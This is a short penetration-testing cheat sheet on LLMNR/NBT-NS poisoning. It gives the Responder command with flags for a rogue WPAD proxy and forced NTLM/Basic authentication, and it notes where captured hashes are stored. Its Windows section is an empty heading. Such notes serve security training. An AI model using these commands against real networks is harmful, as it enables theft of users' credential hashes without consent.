# LLMNR/NBT-NS Poisoning

## From Linux Attack Host

### Responder

``` bash
sudo responder -I $INTERFACE
```

- `-w` starts a WPAD rogue proxy server
- `-f` attemps to fingerprint remote host OS and version
- `-F` Forces NTLM/Basic authentication
- `-P` Force NTLM (transparently)/Basic (prompt) authentication for the proxy.

> Captured hashes are saved in `/usr/share/responder/logs`

## From Windows Attack Host